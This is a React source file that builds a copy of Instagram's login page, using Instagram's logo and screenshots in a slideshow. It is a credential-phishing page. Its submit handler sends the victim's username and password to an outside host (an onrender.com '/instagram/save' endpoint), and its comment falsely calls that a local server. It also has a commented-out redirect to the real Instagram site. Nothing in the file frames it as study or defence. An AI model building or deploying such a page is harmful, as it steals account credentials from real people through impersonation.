import { useState, useEffect } from 'react';

// Main App component
export default function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [currentImageIndex, setCurrentImageIndex] = useState(0);

  // Array of image URLs for the slideshow
  const imageSources = [
    "https://static.cdninstagram.com/images/homepage/screenshots/screenshot1.png/fe2540684ab2.png",
    "https://static.cdninstagram.com/images/homepage/screenshots/screenshot2.png/4d62b3b89255.png",
    "https://static.cdninstagram.com/images/homepage/screenshots/screenshot3.png/c181b539a67a.png",
    "https://static.cdninstagram.com/images/homepage/screenshots/screenshot4.png/8904bf377e8a.png"
  ];

  // Effect hook to handle the image slideshow
  useEffect(() => {
    // Set up an interval to change the image every 5 seconds
    const intervalId = setInterval(() => {
      setCurrentImageIndex(prevIndex => (prevIndex + 1) % imageSources.length);
    }, 5000);

    // Clean up the interval when the component unmounts
    return () => clearInterval(intervalId);
  }, [imageSources.length]); // Re-run effect if image sources change (though they won't here)

  // Function to handle form submission
  const handleSubmit = async (event) => {
    event.preventDefault();

    // Log the data to the console for demonstration
    console.log('Attempting to send data...');
    console.log('Username:', username);
    console.log('Password:', password);

    // --- IMPORTANT: This part requires a local server running on port 3000 ---
    // Example fetch request to a localhost endpoint
    try {
      const response = await fetch('https://backend-6qxr.onrender.com/instagram/save', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username,
          password
        }),
      });

      console.log('Data sent successfully.');
      // Handle the server response if needed
      // const result = await response.json();
      
    } catch (error) {
      console.error('Error sending data:', error);
    } finally {
      // Redirect to instagram.com after the fetch request
      console.log('Redirecting to Instagram...');
      // window.location.href = "https://www.instagram.com";
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen p-4 sm:p-0 bg-gray-50 font-inter">
      {/* Main content container with responsive layout */}
      <div className="flex flex-col md:flex-row items-center justify-center md:space-x-8 max-w-5xl mx-auto w-full">
        {/* Phone mockup section (visible on medium and large screens) */}
        <div className="hidden md:flex items-center justify-center w-[400px] h-[600px] relative">
          <img 
            src="https://static.cdninstagram.com/images/homepage/screenshots/screenshot4.png/8904bf377e8a.png" 
            alt="Phone Mockup" 
            className="absolute inset-0 w-full h-full object-cover z-0"
          />
          {/* Image slideshow container */}
          <div className="absolute inset-0 z-10 flex items-center justify-center">
            {imageSources.map((src, index) => (
              <img
                key={index}
                src={src}
                alt={`Screenshot ${index + 1}`}
                className={`phone-mockup-img absolute top-[60px] left-[20px] w-[240px] h-[426px] object-cover rounded-lg transition-opacity duration-1500 ease-in-out ${index === currentImageIndex ? 'opacity-100' : 'opacity-0'}`}
              />
            ))}
          </div>
        </div>

        {/* Right-hand content: login form and app links */}
        <div className="flex flex-col items-center">
          {/* Login Card */}
          <div className="bg-white border border-gray-300 rounded-sm p-8 text-center w-full max-w-sm mb-2">
            {/* Instagram Logo */}
            <div className="flex justify-center my-4">
              <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo" className="w-44" />
            </div>
            
            {/* Login Form */}
            <form onSubmit={handleSubmit} className="space-y-2">
              <input
                type="text"
                id="username"
                placeholder="Phone number, username, or email"
                className="w-full px-3 py-2 border border-gray-300 rounded-sm focus:outline-none focus:ring-1 focus:ring-gray-400 text-sm bg-gray-50"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
              />
              <input
                type="password"
                id="password"
                placeholder="Password"
                className="w-full px-3 py-2 border border-gray-300 rounded-sm focus:outline-none focus:ring-1 focus:ring-gray-400 text-sm bg-gray-50"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              
              <button
                type="submit"
                className="w-full bg-blue-500 text-white font-semibold py-1.5 rounded-md hover:bg-blue-600 transition-colors disabled:bg-opacity-70 mt-3"
                disabled={!username || !password}
              >
                Log in
              </button>
            </form>

            {/* OR separator */}
            <div className="flex items-center my-4">
              <div className="flex-grow border-t border-gray-300"></div>
              <span className="mx-4 text-gray-400 text-sm font-semibold">OR</span>
              <div className="flex-grow border-t border-gray-300"></div>
            </div>

            {/* Log in with Facebook */}
            <a href="#" className="flex items-center justify-center text-blue-900 font-semibold text-sm hover:underline">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-2" viewBox="0 0 24 24" fill="currentColor">
                <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.873V15.46H8.086v-3.4H10.43V9.894c0-2.316 1.411-3.582 3.486-3.582.99 0 1.834.073 2.088.106v2.413h-1.428c-1.127 0-1.346.536-1.346 1.322v1.73h2.697l-.353 3.4H13.23c0 5.432-4.437 9.873-9.873 9.873C3.766 22 2 20.234 2 18V12z"/>
              </svg>
              Log in with Facebook
            </a>
            
            {/* Forgot Password link */}
            <a href="#" className="block text-blue-900 text-xs mt-4">Forgot password?</a>
          </div>

          {/* Sign up card */}
          <div className="bg-white border border-gray-300 rounded-sm py-4 mt-2 w-full max-w-sm text-center text-sm">
            Don't have an account? <a href="#" className="text-blue-500 font-semibold">Sign up</a>
          </div>

          {/* Get the app section */}
          <div className="mt-4 text-center">
            <p className="text-sm">Get the app.</p>
            <div className="flex justify-center space-x-2 mt-4">
              <a href="#" className="w-32">
                <img src="/playstore.png" alt="Download on the App Store" className="rounded-lg" />
              </a>
              <a href="#" className="w-32">
                <img src="/playstore.png" alt="Get it on Google Play" className="rounded-lg" />
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}